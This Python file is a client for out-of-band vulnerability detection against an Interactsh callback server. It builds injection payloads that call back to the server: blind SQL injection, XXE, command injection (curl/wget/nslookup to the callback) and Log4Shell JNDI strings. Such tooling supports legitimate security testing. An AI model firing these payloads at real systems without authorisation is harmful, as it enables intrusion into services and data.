#!/usr/bin/env python3
"""
Interactsh Client for Out-of-Band (OOB) Detection
Detects blind vulnerabilities via DNS/HTTP callbacks
"""

import json
import time
import hashlib
import secrets
from typing import List, Dict, Optional
from urllib.parse import urljoin
import subprocess


class InteractshClient:
    """Client for OOB detection using Interactsh or custom callback server"""

    def __init__(self, server: str = "oast.pro"):
        """
        Initialize Interactsh client

        Args:
            server: Interactsh server domain (default: oast.pro, alternatives: interact.sh)
        """
        self.server = server
        self.session_id = secrets.token_hex(16)
        self.interactions = []

    def generate_payload(self, identifier: str = None) -> str:
        """
        Generate unique callback URL

        Args:
            identifier: Optional identifier to track specific test

        Returns:
            Unique callback URL like: abc123.oast.pro
        """
        if identifier:
            unique_id = hashlib.md5(
                f"{self.session_id}-{identifier}".encode()
            ).hexdigest()[:12]
        else:
            unique_id = secrets.token_hex(6)

        return f"{unique_id}.{self.server}"

    def check_interactions(self, payload: str, timeout: int = 5) -> List[Dict]:
        """
        Check if callback was received

        Args:
            payload: The callback URL to check
            timeout: How long to wait for callback (seconds)

        Returns:
            List of interaction events (DNS queries, HTTP requests)
        """
        time.sleep(timeout)

        # Extract subdomain from payload
        subdomain = payload.split(".")[0]

        # Query Interactsh API for interactions
        api_url = f"https://{self.server}/api/poll?id={subdomain}"

        try:
            result = subprocess.run(
                ["curl", "-s", "-m", "10", api_url],
                capture_output=True,
                text=True,
                timeout=15,
            )

            if result.returncode == 0 and result.stdout:
                data = json.loads(result.stdout)
                if data and isinstance(data, list):
                    return data
        except:
            pass

        return []

    def test_blind_sqli(self, base_url: str, param: str) -> str:
        """Generate blind SQLi payload with OOB"""
        callback = self.generate_payload(f"sqli-{param}")

        # MySQL DNS exfiltration
        payload = f"' AND (SELECT LOAD_FILE(CONCAT('\\\\\\\\',({callback}),'\\\\x')))"

        return payload, callback

    def test_blind_ssrf(self, identifier: str = "ssrf") -> str:
        """Generate SSRF callback URL"""
        callback = self.generate_payload(identifier)
        return f"http://{callback}", callback

    def test_blind_xxe(self, identifier: str = "xxe") -> tuple:
        """Generate XXE payload with OOB"""
        callback = self.generate_payload(identifier)

        xxe_payload = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://{callback}/xxe">
]>
<root>&xxe;</root>"""

        return xxe_payload, callback

    def test_blind_rce(self, identifier: str = "rce") -> tuple:
        """Generate RCE payloads with OOB"""
        callback = self.generate_payload(identifier)

        payloads = [
            f"curl http://{callback}/rce",
            f"wget http://{callback}/rce",
            f"nslookup {callback}",
            f"ping -c 1 {callback}",
        ]

        return payloads, callback

    def test_log4shell_oob(self, identifier: str = "log4j") -> tuple:
        """Generate Log4Shell payload with OOB"""
        callback = self.generate_payload(identifier)

        payload = f"${{jndi:ldap://{callback}/a}}"

        return payload, callback


# Standalone test
if __name__ == "__main__":
    print("Testing Interactsh Client...")

    client = InteractshClient()

    # Test 1: Generate callback URL
    callback = client.generate_payload("test")
    print(f"Generated callback: {callback}")

    # Test 2: Blind SQLi payload
    sqli_payload, sqli_callback = client.test_blind_sqli("https://example.com", "id")
    print(f"SQLi payload: {sqli_payload}")
    print(f"SQLi callback: {sqli_callback}")

    # Test 3: Check for interactions
    print(f"\nWaiting 5 seconds for callbacks...")
    interactions = client.check_interactions(callback, timeout=5)
    print(f"Interactions received: {len(interactions)}")
